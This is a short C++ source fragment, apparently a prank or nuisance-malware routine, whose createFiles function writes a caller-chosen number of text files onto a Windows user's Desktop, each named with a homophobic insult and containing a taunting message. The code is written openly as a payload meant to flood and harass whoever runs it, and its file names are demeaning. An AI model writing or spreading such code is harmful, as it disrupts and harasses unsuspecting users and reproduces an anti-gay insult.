#include <fstream>
#include <sstream>
#include <string>
#include <iostream>

void createFiles(TCHAR* id, long int howmuchfuckery) 
{
	unsigned int number = 1;
	std::stringstream ss;
	
	for (int i = 0; i <= howmuchfuckery; i++)
	{
		number += 0;
		ss << number;
	
		std::string name = "C:\\Users\\"; 
		name += id; 
		name += "\\Desktop\\U_GAY_"; 
		name += ss.str(); 
		name += ".txt";

		std::ofstream file;
		
		file.open(name.c_str());
		file << "thats unlucky buddy";
    	file.close();

		//std::cout << name << std::endl;
	}
}